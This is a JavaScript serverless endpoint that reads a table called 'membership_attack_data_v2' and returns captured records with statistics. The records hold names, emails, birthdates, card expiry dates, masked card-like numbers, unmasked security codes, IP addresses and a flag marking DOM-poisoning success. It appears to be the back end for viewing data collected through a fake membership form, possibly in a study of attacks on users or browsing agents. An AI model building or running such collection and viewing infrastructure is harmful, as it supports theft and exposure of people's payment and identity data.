// Vercel Serverless Function to view captured membership attack data v2
// Endpoint: /api/membership/view-v2

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        // Get query parameters for filtering
        const { limit = 50, dom_success_only } = req.query;

        let result;
        if (dom_success_only === 'true') {
            result = await sql`
                SELECT
                    id,
                    first_name,
                    last_name,
                    email,
                    birthdate,
                    zip_code,
                    CASE
                        WHEN verification_number IS NOT NULL
                        THEN CONCAT('****-****-****-', RIGHT(verification_number, 4))
                        ELSE NULL
                    END as masked_verification_number,
                    exp_month,
                    exp_year,
                    security_code,
                    legal_name,
                    postal_code,
                    dom_poisoning_success,
                    is_field_update,
                    user_agent,
                    ip_address,
                    submitted_at,
                    created_at
                FROM membership_attack_data_v2
                WHERE dom_poisoning_success = true
                ORDER BY created_at DESC
                LIMIT ${parseInt(limit)}
            `;
        } else {
            result = await sql`
                SELECT
                    id,
                    first_name,
                    last_name,
                    email,
                    birthdate,
                    zip_code,
                    CASE
                        WHEN verification_number IS NOT NULL
                        THEN CONCAT('****-****-****-', RIGHT(verification_number, 4))
                        ELSE NULL
                    END as masked_verification_number,
                    exp_month,
                    exp_year,
                    security_code,
                    legal_name,
                    postal_code,
                    dom_poisoning_success,
                    is_field_update,
                    user_agent,
                    ip_address,
                    submitted_at,
                    created_at
                FROM membership_attack_data_v2
                ORDER BY created_at DESC
                LIMIT ${parseInt(limit)}
            `;
        }

        // Calculate statistics
        const stats = {
            total_records: result.length,
            successful_poisoning: result.filter(r => r.dom_poisoning_success).length,
            with_verification_data: result.filter(r => r.masked_verification_number).length,
            field_updates: result.filter(r => r.is_field_update).length,
            final_submissions: result.filter(r => !r.is_field_update).length
        };

        res.status(200).json({
            success: true,
            message: 'Membership attack v2 data retrieved',
            statistics: stats,
            data: result,
            table: 'membership_attack_data_v2',
            note: 'Verification numbers are masked for security'
        });

    } catch (error) {
        console.error('Failed to retrieve membership v2 data:', error);
        res.status(500).json({
            error: 'Failed to retrieve membership attack v2 data',
            details: error.message
        });
    }
}